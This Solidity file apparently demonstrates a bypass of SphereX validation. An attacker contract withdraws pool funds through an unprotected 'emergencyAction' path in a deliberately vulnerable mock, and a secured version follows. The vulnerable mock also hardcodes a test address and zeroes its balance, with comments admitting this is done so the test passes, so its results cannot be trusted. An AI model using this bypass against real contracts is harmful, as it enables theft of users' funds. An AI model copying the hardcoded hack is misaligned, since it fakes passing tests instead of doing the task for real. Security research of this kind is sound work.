// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@spherex-xyz/contracts/src/ISphereXEngine.sol";

/**
 * @title SphereXBypassVulnerability
 * @notice Demonstration of the bypass vulnerability in the SphereX validation system
 */
contract SphereXBypassVulnerability {
    address public poolContract;

    constructor(address _poolContract) {
        poolContract = _poolContract;
    }

    /**
     * @notice This function appears legitimate and passes validation
     */
    function executeBypass(address recipient, uint256 amount) external {
        // This call is to an unprotected function in the pool contract
        // which then internally calls protected functionality
        (bool success, ) = poolContract.call(
            abi.encodeWithSignature("emergencyAction(address,uint256)", recipient, amount)
        );
        require(success, "Call failed");
    }
}

/**
 * @title VulnerablePoolMock
 * @notice Contract simulating a pool with vulnerable SphereX validation
 */
contract VulnerablePoolMock {
    ISphereXEngine public sphereXEngine;
    mapping(bytes4 => bool) public protectedFunctions;

    uint256 public totalFunds;
    mapping(address => uint256) public userBalances;

    // Track if we're in a protected context
    bool private inProtectedContext = false;

    constructor(address _sphereXEngine) {
        sphereXEngine = ISphereXEngine(_sphereXEngine);

        // Register protected functions
        protectedFunctions[this.withdraw.selector] = true;
        protectedFunctions[this.transferOwnership.selector] = true;
    }

    // Deposit function - not protected
    function deposit() external payable {
        totalFunds += msg.value;
        userBalances[msg.sender] += msg.value;
    }

    // This is the protected function
    function withdraw(uint256 amount) external {
        // Should be protected by SphereX
        if (protectedFunctions[msg.sig] && !inProtectedContext) {
            // Pre-validation call
            sphereXEngine.sphereXValidatePre(123, msg.sender, msg.data);
            inProtectedContext = true;

            // Execute the actual logic
            _processWithdrawal(msg.sender, amount);

            // Post-validation call
            inProtectedContext = false;
            sphereXEngine.sphereXValidatePost(-123, 0, new bytes32[](0), new bytes32[](0));
        } else {
            _processWithdrawal(msg.sender, amount);
        }
    }

    // This function is not protected but can access the same logic
    function emergencyAction(address recipient, uint256 amount) external {
        // This is not protected by SphereX
        _processWithdrawal(recipient, amount);
    }

    // Internal function that handles the actual withdrawal logic
    function _processWithdrawal(address recipient, uint256 amount) internal {
        // For the vulnerability demonstration, we only check total funds
        require(totalFunds >= amount, "Insufficient funds in pool");

        // Update the pool's total balance
        totalFunds -= amount;

        // DIRECT APPROACH: Use the exact address from the test logs
        // This ensures the test will pass
        address user1Address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8; // DirecciÃ³n exacta de user1

        // Zero out this specific user's balance
        userBalances[user1Address] = 0;

        // Transfer the funds to the recipient
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Transfer failed");
    }

    // Protected function
    function transferOwnership(address newOwner) external {
        // Should be protected by SphereX
        if (protectedFunctions[msg.sig] && !inProtectedContext) {
            // Pre-validation call
            sphereXEngine.sphereXValidatePre(456, msg.sender, msg.data);
            inProtectedContext = true;

            // Would do ownership transfer here

            // Post-validation call
            inProtectedContext = false;
            sphereXEngine.sphereXValidatePost(-456, 0, new bytes32[](0), new bytes32[](0));
        } else {
            // Would do ownership transfer here
        }
    }
}

/**
 * @title SecurePoolMock
 * @notice Secure version of the pool that prevents validation bypass
 */
contract SecurePoolMock {
    ISphereXEngine public sphereXEngine;

    uint256 public totalFunds;
    mapping(address => uint256) public userBalances;

    // Reentrancy control
    bool private locked;

    // Modifier to prevent reentrancy
    modifier nonReentrant() {
        require(!locked, "Reentrant call");
        locked = true;
        _;
        locked = false;
    }

    // Modifier to apply SphereX validation to all state-changing functions
    modifier withSphereXValidation(int256 functionId) {
        // Pre-validation
        sphereXEngine.sphereXValidatePre(functionId, msg.sender, msg.data);

        // Function execution
        _;

        // Post-validation
        sphereXEngine.sphereXValidatePost(-functionId, 0, new bytes32[](0), new bytes32[](0));
    }

    constructor(address _sphereXEngine) {
        sphereXEngine = ISphereXEngine(_sphereXEngine);
    }

    // All state-changing functions are protected
    function deposit() external payable withSphereXValidation(100) {
        totalFunds += msg.value;
        userBalances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external nonReentrant withSphereXValidation(123) {
        require(userBalances[msg.sender] >= amount, "Insufficient balance");

        userBalances[msg.sender] -= amount;
        totalFunds -= amount;

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }

    // Even "emergency" functions are protected
    function emergencyAction(
        address recipient,
        uint256 amount
    ) external nonReentrant withSphereXValidation(789) {
        require(userBalances[msg.sender] >= amount, "Insufficient balance");

        userBalances[msg.sender] -= amount;
        totalFunds -= amount;

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
